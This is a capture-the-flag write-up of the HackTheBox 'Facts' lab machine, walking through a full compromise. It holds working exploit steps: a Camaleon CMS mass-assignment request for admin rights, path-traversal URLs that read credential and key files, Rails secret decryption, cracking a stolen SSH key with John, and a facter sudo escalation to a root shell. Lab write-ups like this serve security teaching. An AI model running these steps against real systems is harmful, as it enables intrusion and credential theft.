# Facts – HackTheBox Writeup

**Target:** Facts (10.129.25.50)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Attack Path:** CMS Mass Assignment → Path Traversal → MinIO Credential Theft → SSH Key Extraction → Facter Sudo Exploit

---

## Recon

### Port Scan

```bash
nmap -sV -p- --min-rate 5000 10.129.25.50
```

Three ports open. SSH on 22, nginx on 80 serving a website, and a Golang HTTP server on 54321. That last one on the weird port is immediately suspicious. Standard stuff on standard ports is boring, custom services on random high ports are usually where the fun is.

### What's on Port 54321

```bash
curl -v http://facts.htb:54321/
```

The `-v` flag is the key here. Without it you just see an XML error message saying access denied. With it you get all the response headers, and those told us everything. `Server: MinIO` plus `X-Amz-Request-Id` and `X-Amz-Id-2`. That's MinIO, an S3-compatible object storage server. Filed that away because it turned out to be the backbone of the entire box.

Added the hostname to /etc/hosts:

```bash
echo '10.129.25.50 facts.htb' | sudo tee -a /etc/hosts
```

### Directory Fuzzing and Wildcard Headaches

Ran Gobuster on both ports and immediately hit a wall:

```
the server returns a status code that matches the provided options for non existing urls.
http://10.129.25.50/5d66faec-... => 302 (Length: 154)
```

What's happening here is that Gobuster automatically tests a random UUID URL that definitely doesn't exist. If the server responds to that fake URL with a normal looking response (in this case a 302 redirect with a body of 154 bytes), that means the server responds to literally everything the same way. It's a catch-all. So every word in your wordlist will "match" and the results are useless.

The fix is to tell Gobuster to ignore responses with that specific body size:

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt --exclude-length 154
gobuster dir -u http://facts.htb:54321 -w /usr/share/wordlists/dirb/common.txt --exclude-length 351
```

The "length" is the size of the HTTP response body in bytes. Every fake page returns the exact same redirect body at 154 bytes. A real page would have different content and therefore a different size. By filtering out 154, only genuine hits show up.

---

## Getting Into the CMS

### Identifying Camaleon CMS

Found a login page at `/admin/login`. Didn't need any fancy tools to identify the CMS because the HTML source gave it away immediately:

1. Asset paths had `/assets/camaleon_cms/` in them. Literally says the name right there.
2. Form fields used `name="user[username]"` which is Ruby on Rails parameter syntax. The square brackets tell Rails to build nested objects.
3. There was an `authenticity_token` hidden field which is Rails' built-in CSRF protection.
4. Standard Camaleon routes like `/admin/register` and `/admin/forgot`.
5. A captcha endpoint at `/captcha?len=5` which is Camaleon's built-in captcha.

The lesson here is to always read the page source. Right-click, view source, read everything. Asset paths, comments, hidden fields. They leak the technology stack every single time.

### Registering an Account

The login page had a "Create an account" link going to `/admin/register`. Instead of messing around with SQL injection or brute forcing the login, I just made an account. Always look for the path of least resistance. Why pick the lock when the window is open?

### Escalating to Admin (CVE-2025-2304)

Found the CMS version in the admin panel: Camaleon CMS 2.9.0. Googled `camaleon cms 2.9.0 CVE` and found CVE-2025-2304, a Mass Assignment vulnerability in the `updated_ajax` method of the UsersController.

Mass Assignment is a Rails-specific bug. When you submit a form, Rails takes all the parameters and feeds them into the model. If the developer doesn't whitelist which parameters are allowed, you can sneak in extra ones. The password change form only sends `password` and `password_confirmation`, but the server happily accepts `role` too.

Set up Burp Suite as a proxy. In Firefox go to Settings, Network, Manual Proxy, set it to `127.0.0.1` port `8080`. Now all your browser traffic flows through Burp.

The workflow goes like this:

1. Keep Intercept OFF while browsing normally so pages load fine
2. Navigate to the password change page
3. Turn Intercept ON right before hitting submit
4. Burp catches the request and holds it so you can edit it
5. Make your changes
6. Hit Forward to send it
7. Turn Intercept OFF again

The intercepted POST body looked like:

```
_method=patch&authenticity_token=TOKEN&password%5Bpassword%5D=torch1234&password%5Bpassword_confirmation%5D=torch1234
```

Quick detour on the URL encoding. `%5B` is `[` and `%5D` is `]`. So `password%5Bpassword%5D` is really `password[password]`. That's how Rails does nested parameters. The server sees it as a hash: `params[:password][:password]`.

Added `&password%5Brole%5D=admin` to the end of the body. That translates to `password[role]=admin`. Hit Forward. Reloaded the page. Full admin access with Dashboard, Content, Media, Appearance, Plugins, Users, Settings, everything.

---

## Reading Files Off the Server

### Path Traversal (CVE-2026-1776)

Camaleon 2.9.0 also has a path traversal flaw in the S3 uploader's `download_private_file` endpoint. As an admin you can read arbitrary files by climbing out of the intended directory with `../`:

```
http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd
```

Each `../` goes up one directory. Three levels up from where the app stores its files gets us to the filesystem root, then we go down into `/etc/passwd`.

Always test path traversal with `/etc/passwd` first. It exists on every Linux system, it's world-readable, and it shows you all the user accounts. From it I learned there are two real users:

- `trivia` with uid 1000 and a bash shell
- `william` with uid 1001 and a bash shell

Everyone else has `/usr/sbin/nologin` or `/bin/false` so they can't log in.

Grabbed the user flag right away:

```
http://facts.htb/admin/media/download_private_file?file=../../../home/william/user.txt
```

### Finding Where the App Lives

Tried reading config files but didn't know the app's install path. Tried `/var/www/html/config/secrets.yml`, `/home/trivia/config/`, `/opt/facts/`. All came back as Internal Server Error meaning the files just don't exist there.

Read the Nginx config to figure things out:

```
http://facts.htb/admin/media/download_private_file?file=../../../etc/nginx/sites-enabled/default
```

But it only served static files from `/var/www/html`. No proxy to Rails at all. The Rails app was running on its own somewhere else.

The breakthrough was `/proc/self/cwd/`. On Linux there's a virtual filesystem at `/proc/` that exposes info about running processes. `/proc/self/` refers to whatever process is handling your request, which in this case is the Rails app. And `/proc/self/cwd` is a symlink to that process's working directory. Doesn't matter where the app is installed, this always points to the right place:

```
http://facts.htb/admin/media/download_private_file?file=../../../proc/self/cwd/config/storage.yml
```

That worked. This is a universal trick. Whenever you have path traversal but don't know the app directory, `/proc/self/cwd/` gets you there.

### Extracting All the Secrets

Read the Rails master key:

```
http://facts.htb/admin/media/download_private_file?file=../../../proc/self/cwd/config/master.key
```

Got `b0650437b2208a9fab449fb92f67bc40`. This little hex string is the key that decrypts all of Rails' encrypted secrets.

Downloaded the encrypted credentials file and tried to decrypt it with Rails first:

```bash
cd /tmp
rails new tempapp --minimal
cd tempapp
echo "b0650437b2208a9fab449fb92f67bc40" > config/master.key
cp ~/Downloads/credentials.yml.enc config/credentials.yml.enc
EDITOR=cat rails credentials:show
```

That didn't work. Rails wanted a bunch of gems installed and kept complaining about missing dependencies like psych, irb, rdoc. Way too much hassle for just decrypting one file. Did it with plain Ruby instead:

```ruby
ruby -e '
require "openssl"
require "base64"
key = ["b0650437b2208a9fab449fb92f67bc40"].pack("H*")
data = File.read("credentials.yml.enc")
encrypted_data, iv, auth_tag = data.split("--").map { |v| Base64.strict_decode64(v) }
cipher = OpenSSL::Cipher::AES.new(128, :GCM)
cipher.decrypt
cipher.key = key
cipher.iv = iv
cipher.auth_tag = auth_tag
puts cipher.update(encrypted_data) + cipher.final
'
```

Rails uses AES-128-GCM encryption. The `.enc` file stores `encrypted_data--iv--auth_tag` separated by double dashes, all Base64-encoded. Got the `secret_key_base` out of it. Kept that as a backup for a potential deserialization attack but ended up not needing it.

Read the database config next:

```
http://facts.htb/admin/media/download_private_file?file=../../../proc/self/cwd/config/database.yml
```

SQLite. Database file at `storage/production.sqlite3`. Downloaded it:

```
http://facts.htb/admin/media/download_private_file?file=../../../proc/self/cwd/storage/production.sqlite3
```

Opened it up and hit the jackpot in the `cama_metas` table. Camaleon stores all its site configuration as JSON blobs in this table:

```bash
sqlite3 production.sqlite3 "SELECT * FROM cama_metas;"
```

Quick note on SQLite vs MySQL. SQLite uses dot-commands instead of SQL keywords for meta operations. So it's `.tables` to list tables, not `SHOW TABLES`. Tripped me up for a second.

Buried in a big JSON blob I found the MinIO credentials:

```
filesystem_s3_access_key: AKIAD461CE2932C2C392
filesystem_s3_secret_key: ISknH8LuTLFptoWtG2d77eC41eb56hUFo9dFFkR4
filesystem_s3_bucket_name: randomfacts
filesystem_s3_endpoint: http://localhost:54321
```

---

## From MinIO to SSH

### Accessing MinIO

MinIO speaks the S3 protocol so the AWS CLI works with it. Just point `--endpoint-url` at the MinIO server instead of Amazon:

```bash
aws configure
# Access Key: AKIAD461CE2932C2C392
# Secret Key: ISknH8LuTLFptoWtG2d77eC41eb56hUFo9dFFkR4
# Region: us-east-1
# Output: json

aws --endpoint-url http://facts.htb:54321 s3 ls
```

Two buckets: `randomfacts` which has the website images, and `internal` which is way more interesting.

### Finding the SSH Key

The internal bucket had thousands of files, mostly Ruby gem cache junk. Instead of scrolling through all of it I filtered for interesting filenames:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/ --recursive \
  | grep -iE "key|pass|cred|ssh|env|conf|secret|flag|root|id_rsa|backup"
```

The `grep -iE` does case-insensitive extended regex matching. When you're staring at massive outputs, always filter first. Found exactly what I needed:

```
.ssh/authorized_keys
.ssh/id_ed25519
```

Downloaded it:

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ~/id_ed25519
chmod 600 ~/id_ed25519
```

The `chmod 600` is mandatory. SSH flat out refuses to use private keys that other users can read. 600 means only the owner gets read and write permissions, nobody else.

### Cracking the Passphrase

Tried to SSH in but the key was password-protected. Used John the Ripper:

```bash
ssh2john ~/id_ed25519 > ~/id_ed25519.hash
john ~/id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

`ssh2john` converts the SSH key into a hash format that John can work with. Then John tries every word in rockyou.txt as the passphrase. Ed25519 keys with bcrypt are slow to crack, only about 24 attempts per second, but the passphrase was `dragonballz` which is in rockyou so it only took a couple minutes.

```bash
ssh -i ~/id_ed25519 trivia@facts.htb
# Passphrase: dragonballz
```

We're in.

---

## Privilege Escalation to Root

### sudo -l

First command after getting a shell. Always.

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

User `trivia` can run facter as root without a password. Facter is a Puppet tool that collects system information, things like OS version, IP address, memory. They call these "facts". The important part is that facter supports loading custom facts from external directories. These are Ruby files that it evaluates at runtime.

### First Attempt (Failed)

```bash
mkdir -p /tmp/facts
echo 'Facter.add(:exploit) { setcode { system("/bin/bash") } }' > /tmp/facts/exploit.rb
sudo FACTERLIB=/tmp/facts /usr/bin/facter
# sudo: sorry, you are not allowed to set the following environment variables: FACTERLIB
```

The `FACTERLIB` environment variable tells facter where to look for custom facts. But the sudo config had `env_reset` which strips all environment variables before running the command. So you can't sneak anything in through the environment.

### Second Attempt (Worked)

Here's the key insight. `env_reset` blocks environment variables, not command line arguments. Checked if facter has a flag that does the same thing as FACTERLIB, and it does:

```bash
sudo /usr/bin/facter --custom-dir /tmp/facts
```

Root shell. The Ruby code creates a custom fact called `exploit`. When facter evaluates it, the `setcode` block runs `system("/bin/bash")`. Since facter is running as root through sudo, the bash shell it spawns is also root.

```bash
whoami
# root
cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
nmap -p- → Port 54321 (MinIO) discovered
→ curl -v → Identified MinIO from Server header
→ Web app → Camaleon CMS identified from asset paths in HTML source
→ /admin/register → Created account
→ CVE-2025-2304 (Mass Assignment) → Escalated to admin via Burp
→ CVE-2026-1776 (Path Traversal) → Read arbitrary files
→ /proc/self/cwd/ trick → Found app config without knowing install path
→ production.sqlite3 → MinIO credentials hiding in cama_metas table
→ AWS CLI → Listed MinIO buckets, found "internal"
→ grep through internal bucket → SSH private key
→ John the Ripper → Cracked passphrase (dragonballz)
→ SSH as trivia
→ sudo -l → facter with NOPASSWD
→ facter --custom-dir → Root shell
```

---

## What I Learned

Always run `nmap -p-` to scan all 65535 ports. Port 54321 with MinIO was the key to everything in this box. A default scan would have missed it completely.

`curl -v` on unknown ports is essential. The `Server: MinIO` header identified the technology in one command. Without verbose mode you just see an error and learn nothing useful.

Read the HTML source of every page. The Camaleon CMS name was sitting right there in the asset paths. No guessing needed, no special tools, just view source.

Always google `[software] [version] CVE` the moment you identify something and its version number. Both the Mass Assignment and Path Traversal were known CVEs with clear steps to exploit. Don't try to reinvent the wheel when someone already found the bug.

`/proc/self/cwd/` is a universal trick for path traversal. When you don't know where an app is installed, this virtual symlink always points to its working directory. Works on any Linux system.

Credentials hide in databases. The MinIO keys weren't in a config file, they were stored as a JSON blob inside a SQLite table. Always download the database and search through it when you can.

`grep -iE` with keyword lists saves a ton of time. The MinIO bucket had thousands of files but one grep command found the SSH key instantly. Don't scroll, filter.

When `env_reset` blocks environment variables in sudo, check if the tool has a CLI flag that does the same thing. FACTERLIB got blocked but `--custom-dir` worked fine. Always read `--help` for any binary you can run with sudo, and definitely check GTFOBins.

Burp workflow: Intercept OFF while browsing, ON right before submitting the request you want to modify, edit it, Forward, then OFF again. If the page seems to hang you probably left intercept on.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
